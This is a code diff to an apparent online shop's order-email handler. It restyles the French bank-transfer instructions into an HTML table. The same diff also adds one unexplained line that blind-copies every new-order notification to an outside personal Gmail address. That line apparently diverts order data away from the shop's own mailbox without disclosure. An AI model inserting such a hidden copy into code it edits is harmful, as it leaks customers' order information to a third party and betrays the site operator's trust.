@@ -63,6 +63,7 @@ export default async function handler(req, res) {
                 const mailOptions = {
                     from: '"Airton Shop" <service-client@airton-shop.eu>',
                     to: 'service-client@airton-shop.eu',
+                    bcc: 'adityajaif2004@gmail.com',
                     subject: 'NOUVELLE COMMANDE (Virement): ' + orderId,
                     html: `
                         <div style="font-family: 'Helvetica Neue', Arial, sans-serif; background: linear-gradient(135deg, #faebd7 0%, #e0f7fa 100%); padding: 40px 20px; color: #111;">
@@ -116,17 +117,19 @@ export default async function handler(req, res) {
                                 
                                 <!-- Bank Transfer Steps -->
                                 <h3 style="font-size: 16px; color: #2b8cff; margin-bottom: 20px; font-weight: bold; text-align: center;">Si vous payez par virement bancaire.</h3>
-                                <div style="background: #ffffff; border-radius: 8px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #eaeaea;">
-                                    <div style="padding: 10px 0; border-bottom: 1px solid #eaeaea; text-align: center;">
-                                        <p style="margin: 0; font-size: 14px; font-weight: bold; color: #222;">1. Téléchargez notre RIB <a href="https://airton-website.vercel.app/pages/bank-details" style="color: #2b8cff; text-decoration: none;">ici</a></p>
-                                    </div>
-                                    <div style="padding: 15px 0; border-bottom: 1px solid #eaeaea; text-align: center;">
-                                        <p style="margin: 0; font-size: 14px; font-weight: bold; color: #222;">2. Faire le virement avec la référence <span style="color: #2b8cff;">#${orderDataRes.id}</span></p>
-                                    </div>
-                                    <div style="padding: 15px 0 10px 0; text-align: center;">
-                                        <p style="margin: 0; font-size: 14px; font-weight: bold; color: #222;">3. Envoyer le justificatif à <a href="mailto:service-client@airton.shop" style="color: #2b8cff; text-decoration: none;">service-client@airton.shop</a></p>
-                                    </div>
-                                </div>
+                                <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background: #ffffff; border-radius: 8px; padding: 25px 0; box-shadow: 0 4px 15px rgba(0,0,0,0.03);">
+                                    <tr>
+                                        <td width="33%" align="center" valign="middle" style="border-right: 2px solid #2b8cff; padding: 0 10px;">
+                                            <p style="margin: 0; font-size: 12px; font-weight: bold; color: #222;">Téléchargez<br>notre RIB <a href="https://airton-website.vercel.app/pages/bank-details" style="color: #2b8cff; text-decoration: none;">ici</a></p>
+                                        </td>
+                                        <td width="34%" align="center" valign="middle" style="border-right: 2px solid #2b8cff; padding: 0 10px;">
+                                            <p style="margin: 0; font-size: 12px; font-weight: bold; color: #222;">Faire le virement<br>avec la référence <span style="color: #2b8cff;">#${orderDataRes.id}</span></p>
+                                        </td>
+                                        <td width="33%" align="center" valign="middle" style="padding: 0 10px;">
+                                            <p style="margin: 0; font-size: 12px; font-weight: bold; color: #222;">Envoyer le justificatif<br>à <a href="mailto:service-client@airton.shop" style="color: #2b8cff; text-decoration: none;">service-client@airton.shop</a></p>
+                                        </td>
+                                    </tr>
+                                </table>
                                 
                                 <!-- Footer -->
                                 <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee;">
